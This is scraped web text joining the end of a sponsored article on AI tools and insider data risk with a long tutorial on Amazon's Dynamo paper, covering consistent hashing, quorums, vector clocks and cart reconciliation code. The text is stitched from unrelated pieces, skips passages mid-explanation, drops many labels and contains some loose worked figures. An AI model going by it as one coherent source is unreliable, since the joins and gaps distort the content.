‘multi-hop’ activity makes it harder to protect. AI agents and plugins can be installed in more than one system. They gather data from your CRM, compare it to email archives, add it to information from a collaboration platform, and send the results to an analytics tool that’s not part of your company. That's four or five data movements in one automated workflow.</p><h2>The Insider Expansion: Intent vs. Convenience</h2><p>The previous insider threat model was based on intent. You had bad actors within the company stealing data, and careless workers who didn't pay attention to security training. AI has tilted the risk scale from intention to convenience.</p><p>Employees aren't trying to cause harm. They're trying to work more efficiently and meet tomorrow's deadlines. Pasting a customer contract into ChatGPT and asking for a summary is faster than manually reading through 40 pages. Uploading a financial spreadsheet to an AI assistant generates charts in seconds instead of hours. Each decision prioritizes speed over protocol.</p><p>Most workers still don't know where the lines are for policies. Companies are slow to define what data workers can give to AI tools. They haven't defined  or what happens to data once it's entered into an AI system. When the rules aren't clear, people do what they need to do to get their work done.</p><p>Collaboration platforms are the first place most data moves into AI systems. Slack, Teams, Gmail, Google Workspace, and Microsoft 365 are all the 'first hop' for data as it leaves your company's premises and is ingested by today's AI tools.</p><p>OAuth permissions and API connectors enable the connection. An employee installs a productivity plugin that claims to summarize Slack conversations or help them write email replies. The app requests extensive access to workspace data. A lot of people click \"allow\" without knowing what they're permitting. Now, a third-party AI service can read months' worth of messages, shared files, and calendar information.</p><p>CISOs have significant gaps in their ability to see what's happening in these workflows. They often can't answer simple questions about which AI tools employees are using to work together. They don't have any telemetry to track what data goes through these integrations. They don't know who is sending private information to AI systems or where the outputs go after they’re generated.</p><h2>Why Traditional Controls Don't Map Cleanly</h2><p>Legacy security frameworks were built for different, more predictable threat models. As such, they have significant drawbacks in dealing with how AI actually moves data across modern organizations.</p><ul><li>Static vs. dynamic: Traditional DLP and CASB controls rely on static governance, which is based on pre-defined rules regarding where data can be sent. AI introduces fluid and multi-step workflows where data is both consumed and redistributed in mere seconds. The velocity and variability of AI workflows make static policies irrelevant and impractical.</li><li>Human vs. automated: In recent years, insider behavior required humans to make decisions at most steps. AI partially automates the ingestion, transformation, and redistribution of data through agents and/or assistants. IAM frameworks provide access to users but are not designed to control what automated AI workflows may request on behalf of a user.</li><li>Predictable vs. emergent: When workflows follow predictable patterns, security teams can typically pre-classify likely exposure pathways. AI workflows are emergent; an employee may ingest data from five different systems in a way no one anticipated. It's nearly impossible to create rules to protect all possible combinations of data.</li></ul><h2>What CISOs Are Asking (or Will Soon Ask)</h2><p>The questions security leaders are asking help point to where the market is going. These aren't just theoretical questions; they're real-world challenges that require strategic governance.</p><ul><li>Which AI tools are sanctioned versus shadow? To build a successful governance framework, you need to understand all the AI applications currently in use.</li><li>What data categories can enter AI workflows? Companies need to be clear about whether AI systems can handle customer records, financial data, source code, or data that is subject to rules.</li><li>Where does AI-created content travel afterward? AI makes summaries or reports that are shared with other teams or outside partners. It's just as important to keep track of the output as it is the input.</li><li>How do we audit, classify, and log AI interactions? Without logging capabilities, security teams can't investigate incidents or have records ready for compliance regulators when they start asking questions.</li><li>Who owns AI data governance across the organization? Making it clear who is responsible for governance oversight (e.g., the CISO, data teams, legal, or compliance) helps avoid gaps where no one is held accountable.</li></ul><h2>Industry Outlook on Insider Risk&nbsp;</h2><p>Insider risk will no longer be just a problem specific to people; it will also include studying AI workflows and data movement patterns. User behavior analytics alone won't help security teams deal with this. Automated agents, API connectors, and integrations with collaboration platforms are now part of the threat model.&nbsp;</p><p>“Organizations will stop treating human signals, identity data, and technical events as separate streams,” predicts Proofpoint. “The next evolution of insider risk management depends on connecting these areas, because true risk rarely shows up in a single dimension.”</p><p>For this reason, adopting AI will require the whole company to share responsibility. When it comes to managing data governance, application security, legal policy, and compliance mandates, CISOs can't handle this problem on their own. Expect to see joint accountability frameworks in which chief data officers and security leaders work together on AI-specific governance, rather than operating in isolated units.</p><p>AI isn't making new insiders. It's changing how people who work with data share it every day. Instead of asking about intent, the focus has shifted to making these tools more visible and to setting up rules that fit how employees actually use them.&nbsp;</p><p>:::tip\nThis story was distributed as a release by Jon Stojan under HackerNoon’s Business Blogging Program.</p>",

It was a battle-tested solution to real problems at massive scale. I remember when I first read this paper—it fundamentally changed how I thought about distributed systems.</p><p><strong>Dynamo is a distributed key-value storage system.</strong> It was designed to support Amazon’s high-traffic services such as the shopping cart and session management systems. There are no secondary indexes, no joins, no relational semantics—just keys and values, with extreme focus on availability and scalability. It does not provide linearizability or global ordering guarantees, even at the highest quorum settings. If your system requires those properties, Dynamo is not the right tool.</p><p>The core problem Amazon faced was simple to state but brutal to solve: <strong>How do you build a storage system that never says “no” to customers?</strong> When someone tries to add an item to their shopping cart during a network partition or server failure, rejecting that write isn’t acceptable. Every lost write is lost revenue and damaged customer trust.</p><h2>The CAP Theorem Trade-off: Why Dynamo Chooses Availability</h2><p>Before diving into how Dynamo works, you need to understand the fundamental constraint it’s designed around.</p><p>The CAP theorem describes a fundamental trade-off in distributed systems: when a network partition occurs, you must choose between consistency and availability. The three properties are:</p><ul><li>: All nodes see the same data at the same time</li><li>: Every request gets a response (success or failure)</li><li>: System continues working despite network failures</li></ul><p>A common shorthand is “pick 2 of 3,” but this is an oversimplification. In practice, network partitions are unavoidable at scale, so the real decision is: <strong>when partitions occur (and they will), do you sacrifice consistency or availability?</strong> That’s the actual design choice.</p><p>: Network partitions WILL happen. Cables get cut, switches fail, datacenters lose connectivity. You can’t avoid them, so you must choose: Consistency or Availability?</p><h3>Traditional Databases Choose Consistency</h3><pre><code>Database: \"I can't guarantee all replicas are consistent,\n           so I'll reject your write to be safe.\"\nResult: Customer sees error, cart is empty\nImpact: Lost revenue, poor experience\n</code></pre><h3>Dynamo Chooses Availability</h3><pre><code>Dynamo: \"I'll accept your write with the replicas I can reach.\n         The unreachable replica will catch up later.\"\nResult: Customer sees success, item in cart\nImpact: Sale continues, happy customer\n</code></pre><pre><code>When a partition occurs:\n\nTraditional Database: Choose C over A → Sacrifice Availability\n- ✓ All replicas always have same data\n- ✓ No conflicts to resolve\n- ❌ Rejects writes during failures\n- ❌ Poor customer experience\n- ❌ Lost revenue\n\nDynamo:              Choose A over C → Sacrifice Strong Consistency\n- ✓ Accepts writes even during failures\n- ✓ Excellent customer experience\n- ✓ No lost revenue\n- ❌ Replicas might temporarily disagree\n- ❌ Application must handle conflicts\n</code></pre><p>Imagine it’s Black Friday. Millions of customers are shopping. A network cable gets cut between datacenters.</p><p><strong>With traditional database</strong>:</p><pre><code>Time: 10:00 AM - Network partition occurs\nResult: \n- All shopping cart writes fail\n- \"Service Unavailable\" errors\n- Customers can't checkout\n- Twitter explodes with complaints\n- Estimated lost revenue: $100,000+ per minute\n</code></pre><pre><code>Time: 10:00 AM - Network partition occurs\nResult:\n- Shopping cart writes continue\n- Customers see success\n- Some carts might have conflicts (rare)\n- Application merges conflicting versions\n- Estimated lost revenue: $0\n- A few edge cases need conflict resolution (acceptable)\n</code></pre><ol><li><strong>Cost of rejecting a write</strong>: Immediate lost sale ($50-200)</li><li><strong>Cost of accepting a conflicting write</strong>: Occasionally need to merge shopping carts (rarely happens, easily fixable)</li><li>: Accept writes, deal with rare conflicts</li></ol><p><strong>Types of data where Availability &gt; Consistency</strong>:</p><ul><li>Shopping carts (merge conflicting additions)</li><li>Session data (last-write-wins is fine)</li><li>User preferences (eventual consistency acceptable)</li><li>Best seller lists (approximate is fine)</li></ul><p><strong>Types of data where Consistency &gt; Availability</strong>:</p><ul><li>Bank account balances (can’t have conflicting balances)</li><li>Inventory counts (can’t oversell)</li><li>Transaction logs (must be ordered)</li></ul><p>This is why Dynamo isn’t for everything—but for Amazon’s e-commerce use cases, choosing availability over strong consistency was the right trade-off.</p><blockquote><p>: While Dynamo is often described as an AP system, it’s more accurate to call it a <strong>tunable consistency system</strong>. Depending on your R and W quorum configuration, it can behave closer to CP. The AP label applies to its default/recommended configuration optimized for e-commerce workloads.</p></blockquote><h3>1. Consistent Hashing for Partitioning</h3><p>Let me explain this with a concrete example, because consistent hashing is one of those concepts that seems magical until you see it in action.</p><h4>The Problem: Traditional Hash-Based Sharding</h4><p>Imagine you have 3 servers and want to distribute data across them. The naive approach:</p><pre><code># Traditional approach - DON'T DO THIS\ndef get_server(key, num_servers):\n    hash_value = hash(key)\n    return hash_value % num_servers  # Modulo operation\n\n# With 3 servers:\nget_server(\"user_123\", 3)  # Returns server 0\nget_server(\"user_456\", 3)  # Returns server 1\nget_server(\"user_789\", 3)  # Returns server 2\n</code></pre><p>This works… until you add or remove a server. Let’s see what happens when we go from 3 to 4 servers:</p><pre><code># Before (3 servers):\n\"user_123\" → hash % 3 = 0 → Server 0\n\"user_456\" → hash % 3 = 1 → Server 1\n\"user_789\" → hash % 3 = 2 → Server 2\n\n# After (4 servers):\n\"user_123\" → hash % 4 = 0 → Server 0 ✓ (stayed)\n\"user_456\" → hash % 4 = 1 → Server 1 ✓ (stayed)\n\"user_789\" → hash % 4 = 2 → Server 2 ✓ (stayed)\n\n# But wait - this is lucky! In reality, most keys MOVE:\n\"product_ABC\" → hash % 3 = 2 → Server 2\n\"product_ABC\" → hash % 4 = 3 → Server 3 ✗ (MOVED!)\n</code></pre><p>: When you change the number of servers, nearly ALL your data needs to be redistributed. Imagine moving terabytes of data just to add one server!</p><h4>The Solution: Consistent Hashing</h4><p>Consistent hashing solves this by treating the hash space as a circle (0 to 2^32 – 1, wrapping around).</p><p><strong>Step 1: Place servers on the ring</strong></p><p>Each server is assigned a random position on the ring (called a “token”). Think of this like placing markers on a circular racetrack.</p><p><strong>Step 2: Place data on the ring</strong></p><p>When you want to store data, you:</p><ol><li><p>Hash the key to get a position on the ring</p></li><li><p>Walk clockwise from that position</p></li><li><p>Store the data on the first server you encounter</p></li></ol><p>Here’s the ring laid out in order. Keys walk clockwise to the next server:</p><p>: A key walks clockwise until it hits a server. That server owns the key.</p><ul><li> at 30° → walks to 45° → </li><li> at 150° → walks to 200° → </li><li> at 250° → walks to 280° → </li><li> at 300° → walks past 360°, wraps to 0°, continues to 45° → </li></ul><ul><li>: owns everything from 281° to 45° (wraps around)</li><li>: owns everything from 46° to 120°</li><li>: owns everything from 121° to 200°</li><li>: owns everything from 201° to 280°</li></ul><h4>The Magic: Adding a Server</h4><p>Now let’s see why this is brilliant. We add Server E at position 160°:</p><pre><code>BEFORE:\nServer A (45°)  → owns 281°-45°\nServer B (120°) → owns 46°-120°\nServer C (200°) → owns 121°-200°  ← THIS RANGE WILL SPLIT\nServer D (280°) → owns 201°-280°\n\nAFTER:\nServer A (45°)  → owns 281°-45°   ← NO CHANGE\nServer B (120°) → owns 46°-120°   ← NO CHANGE\nServer E (160°) → owns 121°-160°  ← NEW! Takes part of C's range\nServer C (200°) → owns 161°-200°  ← SMALLER range\nServer D (280°) → owns 201°-280°  ← NO CHANGE\n</code></pre><p>: Only keys in range 121°-160° need to move (from C to E). Servers A, B, and D are completely unaffected!</p><h4>The Virtual Nodes Optimization</h4><p>There’s a critical problem with the basic consistent hashing approach: <strong>random distribution can be extremely uneven</strong>.</p><p>When you randomly assign one position per server, you’re essentially throwing darts at a circular board. Sometimes the darts cluster together, sometimes they spread out. This creates hotspots.</p><p>Let me show you a concrete example:</p><pre><code>Scenario: 4 servers with single random tokens\n\nServer A: 10°   }\nServer B: 25°   } ← Only 75° apart! Tiny ranges\nServer C: 100°  }\n\nServer D: 280°  ← 180° away from C! Huge range\n\nRange sizes:\n- Server A owns: 281° to 10° = 89° (25% of ring)\n- Server B owns: 11° to 25° = 14° (4% of ring)  ← Underutilized!\n- Server C owns: 26° to 100° = 74° (21% of ring)\n- Server D owns: 101° to 280° = 179° (50% of ring)  ← Overloaded!\n</code></pre><ol><li>: Server D handles 50% of all data while Server B handles only 4%. This means:</li></ol><ul><li>Server D’s CPU, disk, and network are maxed out</li><li>Server B is mostly idle (wasted capacity)</li><li>Your 99.9th percentile latency is dominated by Server D being overloaded</li></ul><ol><li>: When Server D becomes slow or fails:</li></ol><ul><li>All its 50% load shifts to Server A (the next one clockwise)</li><li>Server A now becomes overloaded</li><li>System performance degrades catastrophically</li></ul><ol><li>: Adding servers doesn’t help evenly because new servers might land in already small ranges</li></ol><p>: Each physical server gets multiple virtual positions (tokens).</p><p>Instead of one dart throw per server, throw many darts. The more throws, the more even the distribution becomes (law of large numbers).</p><p><strong>How Virtual Nodes Fix the Problem:</strong></p><p>Let’s take the same 4 servers, but now each server gets 3 virtual nodes (tokens) instead of 1:</p><pre><code>Physical Server A gets 3 tokens: 10°, 95°, 270°\nPhysical Server B gets 3 tokens: 25°, 180°, 310°\nPhysical Server C gets 3 tokens: 55°, 150°, 320°\nPhysical Server D gets 3 tokens: 75°, 200°, 340°\n\nNow the ring looks like:\n10° A, 25° B, 55° C, 75° D, 95° A, 150° C, 180° B, 200° D, 270° A, 310° B, 320° C, 340° D\n\nRange sizes (approximately):\n- Server A total: 15° + 55° + 40° = 110° (31% of ring)\n- Server B total: 30° + 20° + 30° = 80° (22% of ring)\n- Server C total: 20° + 30° + 20° = 70° (19% of ring)\n- Server D total: 20° + 70° + 20° = 110° (31% of ring)\n</code></pre><p> Load ranges from 19% to 31% instead of 4% to 50%.</p><ol><li>: With more samples (tokens), the random distribution averages out. This is the law of large numbers in action.</li><li><strong>Granular load distribution</strong>: When a server fails, its load is distributed across many servers, not just one neighbor:</li></ol><pre><code>   Server A fails:\n   - Its token at 10° → load shifts to Server B's token at 25°\n   - Its token at 95° → load shifts to Server C's token at 150°\n   - Its token at 270° → load shifts to Server B's token at 310°\n\n   Result: The load is spread across multiple servers!\n</code></pre><ol start=\"3\"><li>: When adding a new server with 3 tokens, it steals small amounts from many servers instead of a huge chunk from one server.</li></ol><p><strong>Real Dynamo configurations:</strong></p><p>The paper mentions different strategies evolved over time. In production:</p><ul><li>Early versions: 100-200 virtual nodes per physical server</li><li>Later optimized to: Q/S tokens per node (where Q = total partitions, S = number of servers)</li><li>Typical setup: Each physical server might have 128-256 virtual nodes</li></ul><p><strong>The Trade-off: Balance vs Overhead</strong></p><p>More virtual nodes means better load distribution, but there’s a cost.</p><p><strong>What you gain with more virtual nodes:</strong></p><pre><code>With 1 token per server (4 servers):\nLoad variance: 4% to 50% (±46% difference) ❌\n\nWith 3 tokens per server (12 virtual nodes):\nLoad variance: 19% to 31% (±12% difference) ✓\n\nWith 128 tokens per server (512 virtual nodes):\nLoad variance: 24% to 26% (±2% difference) ✓✓\n</code></pre><ol><li>: Each node maintains routing information</li></ol><ul><li>1 token per server: Track 4 entries</li><li>128 tokens per server: Track 512 entries</li></ul><ol><li>: Nodes exchange membership info periodically</li></ol><ul><li>More tokens = more data to sync between nodes</li><li>Every second, nodes gossip their view of the ring</li></ul><ol><li>: When nodes join/leave</li></ol><ul><li>More virtual nodes = more partition transfers to coordinate</li><li>But each transfer is smaller (which is actually good for bootstrapping)</li></ul><p>The paper describes how Amazon optimized this over time:</p><pre><code>Strategy 1 (Initial):\n- 100-200 random tokens per server\n- Problem: Huge metadata (multiple MB per node)\n- Problem: Slow bootstrapping (had to scan for specific key ranges)\n\nStrategy 3 (Current):\n- Q/S tokens per server (Q=total partitions, S=number of servers)\n- Equal-sized partitions\n- Example: 1024 partitions / 8 servers = 128 tokens per server\n- Benefit: Metadata reduced to KB\n- Benefit: Fast bootstrapping (transfer whole partition files)\n</code></pre><p><strong>Real production sweet spot:</strong></p><p>Most Dynamo deployments use 128-256 virtual nodes per physical server. This achieves:</p><ul><li>Load distribution within 10-15% variance (good enough)</li><li>Metadata overhead under 100KB per node (negligible)</li><li>Fast failure recovery (load spreads across many nodes)</li></ul><p> Diminishing returns. Going from 128 to 512 tokens only improves load balance by 2-3%, but doubles metadata size and gossip traffic.</p><p>: Physical servers (top) map to multiple virtual positions (bottom) on the ring. This distributes each server’s load across different parts of the hash space.</p><ul><li>More even load distribution</li><li>When a server fails, its load is distributed across many servers (not just one neighbor)</li><li>When a server joins, it steals a small amount from many servers</li></ul><p>Let’s see the difference with real numbers:</p><pre><code>Traditional Hashing (3 servers → 4 servers):\n- Keys that need to move: ~75% (3 out of 4)\n- Example: 1 million keys → 750,000 keys must migrate\n\nConsistent Hashing (3 servers → 4 servers):\n- Keys that need to move: ~25% (1 out of 4)\n- Example: 1 million keys → 250,000 keys must migrate\n\nWith Virtual Nodes (150 vnodes total → 200 vnodes):\n- Keys that need to move: ~12.5% (spread evenly)\n- Example: 1 million keys → 125,000 keys must migrate\n- Load is balanced across all servers\n</code></pre><p>The key insight is this: <strong>Consistent hashing decouples the hash space from the number of servers.</strong></p><ul><li>Traditional: <code>server = hash(key) % num_servers</code> ← num_servers is in the formula!</li><li>Consistent: <code>server = ring.findNextClockwise(hash(key))</code> ← num_servers isn’t in the formula!</li></ul><p>This is why adding/removing servers only affects a small portion of the data. The hash values don’t change—only which server “owns” which range changes, and only locally.</p><p>Think of it like a circular running track with water stations (servers). If you add a new water station, runners only change stations if they’re between the old nearest station and the new one. Everyone else keeps going to their same station.</p><h3>2. Replication Strategy (N, R, W)</h3><h4>The Problem: Availability vs Consistency Trade-off</h4><p>Imagine you’re building Amazon’s shopping cart. A customer adds an item to their cart, but at that exact moment:</p><ul><li>One server is being rebooted for maintenance</li><li>Another server has a network hiccup</li><li>A third server is perfectly fine</li></ul><p><strong>Traditional database approach</strong> (strong consistency):</p><pre><code>Client: \"Add this item to my cart\"\nDatabase: \"I need ALL replicas to confirm before I say yes\"\nServer 1: ✗ (rebooting)\nServer 2: ✗ (network issue)\nServer 3: ✓ (healthy)\n\nResult: \"Sorry, service unavailable. Try again later.\"\n</code></pre><p>: 😡 “I can’t add items to my cart during Black Friday?!”</p><p>This is unacceptable for e-commerce. Every rejected write is lost revenue.</p><h4>Dynamo’s Solution: Tunable Quorums</h4><p>Dynamo gives you three knobs to tune the exact trade-off you want:</p><ul><li>: Number of replicas (how many copies of the data)</li><li>: Read quorum (how many replicas must respond for a successful read)</li><li>: Write quorum (how many replicas must acknowledge for a successful write)</li></ul><p>: When , you guarantee quorum overlap—meaning at least one node that received the write will be queried during any read. This overlap enables detection of the latest version, provided the reconciliation logic correctly identifies the highest vector clock. It does not automatically guarantee read-your-writes unless the coordinator properly resolves versions.</p><p>Let me show you why this matters with real scenarios:</p><pre><code>N = 3  # Three replicas for durability\nR = 1  # Read from any single healthy node\nW = 1  # Write to any single healthy node\n\n# Trade-off analysis:\n# ✓ Writes succeed even if 2 out of 3 nodes are down\n# ✓ Reads succeed even if 2 out of 3 nodes are down\n# ✓ Maximum availability - never reject customer actions\n# ✗ Might read stale data\n# ✗ Higher chance of conflicts (but we can merge shopping carts)\n</code></pre><p><strong>What happens during failure:</strong></p><pre><code>Client: \"Add item to cart\"\nCoordinator tries N=3 nodes:\n- Node 1: ✗ Down\n- Node 2: ✓ ACK (W=1 satisfied!)\n- Node 3: Still waiting...\n\nResult: SUCCESS returned to client immediately\nNode 3 eventually gets the update (eventual consistency)\n</code></pre><h4>Scenario 2: Session State (Balanced Approach)</h4><pre><code>N = 3\nR = 2  # Must read from 2 nodes\nW = 2  # Must write to 2 nodes\n\n# Trade-off analysis:\n# ✓ R + W = 4 &gt; N = 3 → Read-your-writes guaranteed\n# ✓ Tolerates 1 node failure\n# ✓ Good balance of consistency and availability\n# ✗ Write fails if 2 nodes are down\n# ✗ Read fails if 2 nodes are down\n</code></pre><p><strong>Why R + W &gt; N enables read-your-writes:</strong></p><pre><code>Write to W=2 nodes: [A, B]\nLater, read from R=2 nodes: [B, C]\n\nBecause W + R = 4 &gt; N = 3, there's guaranteed overlap!\nAt least one node (B in this case) will have the latest data.\n\nThe coordinator detects the newest version by comparing vector clocks.\nThis guarantees seeing the latest write as long as reconciliation\npicks the causally most-recent version correctly.\n</code></pre><h4>Scenario 3: Financial Data (Prioritize Consistency)</h4><pre><code>N = 3\nR = 3  # Must read from ALL nodes\nW = 3  # Must write to ALL nodes\n\n# Trade-off analysis:\n# ✓ Full replica quorum — reduces likelihood of divergent versions\n# ✓ Any read will overlap every write quorum\n# ✗ Write fails if ANY node is down\n# ✗ Read fails if ANY node is down\n# ✗ Poor availability during failures\n</code></pre><p>Systems requiring strict transactional guarantees typically choose CP systems instead. This configuration is technically supported by Dynamo but sacrifices the availability properties that motivate using it in the first place.</p><p>| Config | N | R | W | Availability | Consistency | Use Case |\n|----|----|----|----|----|----|----|\n|  | 3 | 1 | 1 | ⭐⭐⭐⭐⭐ | ⭐⭐ | Shopping cart, wish list |\n|  | 3 | 2 | 2 | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | Session state, user preferences |\n|  | 3 | 3 | 3 | ⭐⭐ | ⭐⭐⭐⭐⭐ | High-stakes reads (not linearizable) |\n|  | 3 | 1 | 3 | ⭐⭐⭐ (reads) | ⭐⭐⭐⭐ | Product catalog, CDN metadata |\n|  | 3 | 3 | 1 | ⭐⭐⭐ (writes) | ⭐⭐⭐ | Click tracking, metrics |</p><blockquote><p><strong>Note on financial systems</strong>: Systems requiring strong transactional guarantees (e.g., bank account balances) typically shouldn’t use Dynamo. That said, some financial systems do build on Dynamo-style storage for their persistence layer while enforcing stronger semantics at the application or business logic layer.</p></blockquote><p>Most systems use  because:</p><ol><li>: Can tolerate up to 2 replica failures before permanent data loss (assuming independent failures and no correlated outages).</li><li>: Tolerates 1 node failure for both reads and writes</li><li>: R + W &gt; N guarantees that read and write quorums overlap, enabling read-your-writes behavior in the absence of concurrent writes.</li><li>: Don’t wait for the slowest node (only need 2 out of 3)</li></ol><p><strong>Real production numbers from the paper:</strong></p><p>Amazon’s shopping cart service during peak (holiday season):</p><ul><li>Configuration: N=3, R=2, W=2</li><li>Handled tens of millions of requests</li><li>Over 3 million checkouts in a single day</li><li>No downtime, even with server failures</li></ul><p>This tunable approach is what made Dynamo revolutionary. You’re not stuck with one-size-fits-all—you tune it based on your actual business requirements.</p><h3>3. Vector Clocks for Versioning</h3><h4>The Problem: Detecting Causality in Distributed Systems</h4><p>When multiple nodes can accept writes independently, you need to answer a critical question: <strong>Are these two versions of the same data related, or were they created concurrently?</strong></p><p><strong>Why timestamps don’t work:</strong></p><pre><code>Scenario: Two users edit the same shopping cart simultaneously\n\nUser 1 at 10:00:01.500 AM: Adds item A → Writes to Node X\nUser 2 at 10:00:01.501 AM: Adds item B → Writes to Node Y\n\nPhysical timestamp says: User 2's version is \"newer\"\nReality: These are concurrent!

These numbers reflect Amazon’s specific workload — high read/write ratio, mostly single-user sessions — and should not be assumed to generalize to all Dynamo deployments:</p><pre><code>99.94%    - Single version (no conflict)\n0.00057%  - 2 versions\n0.00047%  - 3 versions  \n0.00009%  - 4 versions\n</code></pre><p>: Conflicts are RARE in practice!</p><ul><li>Not usually from network failures</li><li>Mostly from concurrent writers (often automated processes/bots)</li><li>Human users rarely create conflicts because they’re slow compared to network speed</li></ul><p>Vector clocks can grow unbounded if many nodes coordinate writes. Dynamo’s solution: <strong>truncate the oldest entries</strong> once the clock exceeds a size threshold.</p><pre><code>// When vector clock exceeds threshold (e.g., 10 entries)\n// Remove the oldest entry based on wall-clock timestamp\n\nvectorClock = {\n  'Sx': {counter: 5, timestamp: 1609459200},\n  'Sy': {counter: 3, timestamp: 1609459800},\n  'Sz': {counter: 2, timestamp: 1609460400},\n  // ... 10 more entries\n}\n\n// If size &gt; 10, remove entry with oldest timestamp\n// ⚠ Risk: Dropping an entry collapses causality information.\n//   Two versions that were causally related may now appear\n//   concurrent, forcing the application to resolve a conflict\n//   that didn't actually exist.

This is where rubber meets road.</p><h3>What Is a Conflict (and Why Does It Happen)?</h3><p>A  occurs when two writes happen to the same key on different nodes, without either write “knowing about” the other. This is only possible because Dynamo accepts writes even when nodes can’t communicate—which is the whole point!</p><p>Here’s a concrete sequence of events that creates a conflict:</p><pre><code>Timeline:\nT=0:  Customer logs in. Cart has {shoes} on all 3 nodes.\nT=1:  Network partition: Node1 can't talk to Node2.\nT=2:  Customer adds {jacket} on their laptop → goes to Node1.\n      Cart on Node1: {shoes, jacket}   ← Vector clock: [N1:2]\nT=3:  Customer adds {hat} on their phone → goes to Node2.\n      Cart on Node2: {shoes, hat}      ← Vector clock: [N2:2]\nT=4:  Network heals. Node1 and Node2 compare notes.\n      Node1 says: \"I have version [N1:2]\"\n      Node2 says: \"I have version [N2:2]\"\n      Neither clock dominates the other → CONFLICT!\n</code></pre><p>Neither version is “wrong”—both represent real actions the customer took. Dynamo’s job is to detect this situation (via vector clocks) and surface  to the application so the application can decide what to do.</p><h3>What Does the Application Do With a Conflict?</h3><p>This is the crucial part that the paper delegates to you: <strong>the application must resolve conflicts using business logic</strong>. Dynamo gives you all the concurrent versions; your code decides how to merge them.</p><p>For the shopping cart, Amazon chose a : keep all items from all concurrent versions. The rationale is simple—losing an item from a customer’s cart (missing a sale) is worse than occasionally showing a stale item they already deleted.</p><pre><code>Conflict versions:\n  Version A (from Node1): {shoes, jacket}\n  Version B (from Node2): {shoes, hat}\n\nMerge strategy: union\n  Merged cart: {shoes, jacket, hat}  ← All items preserved\n</code></pre><p>Here’s the actual reconciliation code:</p><pre><code>from __future__ import annotations\nfrom dataclasses import dataclass, field\n\n\nclass VectorClock:\n    def __init__(self, clock: dict[str, int] | None = None):\n        self.clock: dict[str, int] = clock.copy() if clock else {}\n\n    def merge(self, other: \"VectorClock\") -&gt; \"VectorClock\":\n        \"\"\"Merged clock = max of each node's counter across both versions.\"\"\"\n        all_keys = set(self.clock) | set(other.clock)\n        merged = {k: max(self.clock.get(k, 0), other.clock.get(k, 0)) for k in all_keys}\n        return VectorClock(merged)\n\n    def __repr__(self):\n        return f\"VectorClock({self.clock})\"\n\n\n@dataclass\nclass ShoppingCart:\n    items: list[str] = field(default_factory=list)\n    vector_clock: VectorClock = field(default_factory=VectorClock)\n\n    @staticmethod\n    def reconcile(carts: list[\"ShoppingCart\"]) -&gt; \"ShoppingCart\":\n        if len(carts) == 1:\n            return carts[0]  # No conflict, nothing to do\n\n        # Merge strategy: union of all items (never lose additions).\n        # This is Amazon's choice for shopping carts.\n        # A different application might choose last-write-wins or something else.\n        all_items: set[str] = set()\n        merged_clock = VectorClock()\n\n        for cart in carts:\n            all_items.update(cart.items)          # Union: keep everything\n            merged_clock = merged_clock.merge(cart.vector_clock)\n\n        return ShoppingCart(items=sorted(all_items), vector_clock=merged_clock)\n\n\n# Example conflict scenario\ncart1 = ShoppingCart(items=[\"shoes\", \"jacket\"], vector_clock=VectorClock({\"N1\": 2}))\ncart2 = ShoppingCart(items=[\"shoes\", \"hat\"],    vector_clock=VectorClock({\"N2\": 2}))\n\n# Dynamo detected a conflict and passes both versions to our reconcile()\nreconciled = ShoppingCart.reconcile([cart1, cart2])\nprint(reconciled.items)  # ['hat', 'jacket', 'shoes'] — union!\n</code></pre><h3>The Deletion Problem (Why This Gets Tricky)</h3><p>The union strategy has a nasty edge case: <strong>deleted items can come back from the dead</strong>.</p><pre><code>T=0:  Cart: {shoes, hat}\nT=1:  Customer removes hat → Cart: {shoes}           Clock: [N1:3]\nT=2:  Network partition — Node2 still has old state\nT=3:  Some concurrent write to Node2                  Clock: [N2:3]\nT=4:  Network heals → conflict detected\nT=5:  Union merge: {shoes} ∪ {shoes, hat} = {shoes, hat}\n\nResult: Hat is BACK! Customer removed it, but it reappeared.\n</code></pre><p>Amazon explicitly accepts this trade-off. A “ghost” item in a cart is a minor annoyance. Losing a cart addition during a Black Friday sale is lost revenue.</p><blockquote><p>: Merge logic must be domain-specific and carefully designed. Adding items is commutative (order doesn’t matter) and easy to merge. Removing items is not—a deletion in one concurrent branch may be silently ignored during a union-based merge. This is an intentional trade-off in Dynamo’s design, but it means the application must reason carefully about add vs. remove semantics. If your data doesn’t naturally support union merges (e.g., a counter, a user’s address), you need a different strategy—such as CRDTs, last-write-wins with timestamps, or simply rejecting concurrent writes for that data type.</p></blockquote><p>The diagrams above show the high-level flow, but let’s walk through what actually happens step-by-step during a read and a write. Understanding this concretely will make the earlier concepts click.</p><p><strong>Step-by-step narration of a PUT request:</strong></p><ol><li><p> to any node (via a load balancer) or directly to the coordinator.</p></li><li><p><strong>The coordinator is determined</strong> — this is the first node in the preference list for the key’s hash position on the ring.</p></li><li><p> — the coordinator increments its own counter in the vector clock, creating a new version.</p></li><li><p><strong>The coordinator writes locally</strong>, then fans out the write to the other N-1 nodes in the preference list simultaneously.</p></li><li><p><strong>The coordinator waits for W acknowledgments.</strong> It does NOT wait for all N — just the first W to respond. The remaining nodes that haven’t responded yet will get the write eventually (or via hinted handoff if they’re down).</p></li><li><p><strong>Once W ACKs arrive, the coordinator returns 200 OK</strong> to the client. From the client’s perspective, the write is done.</p></li></ol><p><strong>Key insight about the write path</strong>: The client gets a success response as soon as W nodes confirm. The other (N – W) nodes will receive the write asynchronously. This is why the system is “eventually consistent”—all nodes  have the data, just not necessarily at the same moment.</p><p><strong>Step-by-step narration of a GET request:</strong></p><ol><li> to the coordinator for that key.</li><li><strong>The coordinator sends read requests to all N nodes</strong> in the preference list simultaneously (not just R). This is important — it contacts all N, but only needs R to respond.</li><li> The coordinator returns as soon as R nodes have replied, without waiting for the slower ones.</li><li><strong>Compare the versions returned.</strong> The coordinator checks all the vector clocks:</li></ol><ul><li>If all versions are identical → return the single version immediately.</li><li>If one version’s clock dominates the others (it’s causally “newer”) → return that version.</li><li>If versions are concurrent (neither clock dominates) → return  to the client, which must merge them.</li></ul><ol><li><p> happens in the background: if the coordinator noticed any node returned a stale version, it sends the latest version to that node to bring it up to date.</p></li></ol><p><strong>Why does the client receive the conflict instead of the coordinator resolving it?</strong> Because Dynamo is a general-purpose storage engine. It doesn’t know whether you’re storing a shopping cart, a user profile, or a session token. Only  knows how to merge two conflicting versions in a way that makes business sense. The coordinator hands you the raw concurrent versions along with the vector clock context, and you do the right thing for your use case.</p><p><strong>The vector clock context is the key to closing the loop</strong>: when the client writes the merged version back, it must include the context (the merged vector clock). This tells Dynamo that the 